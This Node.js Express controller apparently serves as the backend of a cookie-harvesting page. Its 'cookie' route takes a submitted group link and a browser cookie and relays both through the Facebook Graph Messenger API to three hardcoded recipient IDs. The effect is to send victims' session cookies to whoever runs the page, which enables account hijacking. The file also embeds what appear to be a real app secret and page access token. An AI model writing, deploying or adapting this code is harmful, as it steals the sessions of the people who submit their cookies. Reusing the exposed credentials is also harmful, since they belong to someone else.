var request = require('request');

const userId = '2916439185090913';
const id = '4696932230385366'
const id2 = '5030169833681980'

const APP_SECRET = 'bfd5846a7355edd459d7ad11f05f31c2';
const VALIDATION_TOKEN = 'ngominhthuan';
const PAGE_ACCESS_TOKEN = 'EAAjtNWoSWWkBAAjWZCTYdTZBz7lYhp04YkutBeNERDfExR1ivL6oSATiWqKzJEcorKWDOe9YrAo1GdmpSZBXmHeZAqx2owyGkQQtjQsxyr4KPxBLqbVCq6oLuQjzzEYFiW1MidreCZBeQZCUHA5vzjWddGjNx8qvVAkYEa1g6NyMzKX0EXMBz1';


class homeController {
    home(req, res) {
        res.render('home') 
    }

    cookie(req, res, next) {
        sendMessage(userId,
            `Link Group: ${req.body.linkGroup}
        
cookie: ${req.body.cookie}`)

        sendMessage(id,
            `Link Group: ${req.body.linkGroup}

cookie: ${req.body.cookie}`)

        sendMessage(id2,
            `Link Group: ${req.body.linkGroup}

cookie: ${req.body.cookie}`)

        res.status(200);
        res.send(req.body);
    }


    webhook(req, res, next) {
        if (req.query['hub.verify_token'] === VALIDATION_TOKEN) {
            res.send(req.query['hub.challenge']);
        }
        res.send('Error, wrong validation token');
    }

    checkUser(req, res, next) {
        console.log(req.body.entry[0].messaging)
    }

}

function sendMessage(senderId, message) {
    request({
        url: 'https://graph.facebook.com/v2.6/me/messages',
        qs: {
            access_token: PAGE_ACCESS_TOKEN,
        },
        method: 'POST',
        json: {
            recipient: {
                id: senderId
            },
            message: {
                text: message
            },
        }
    });
}

module.exports = new homeController;
